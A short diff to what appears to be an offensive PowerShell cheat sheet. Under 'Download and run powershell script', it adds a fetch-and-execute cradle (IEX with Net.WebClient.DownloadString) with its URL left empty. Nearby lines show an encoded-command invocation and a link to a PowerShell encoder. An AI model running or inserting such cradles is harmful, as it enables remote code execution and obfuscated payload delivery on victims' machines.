@@ -56,6 +56,7 @@ powershell.exe IEX (New-Object Net.WebClient).DownloadFile("")
 ## Download and run powershell script
 ```powershell
 powershell.exe IEX (New-Object Net.WebClient).DownloadString("")
+IEX((New-Object Net.WebClient).DownloadString(""))
 powershell.exe -e 
 ```
 <a href="https://raikia.com/tool-powershell-encoder">Powershell Encoder</a>
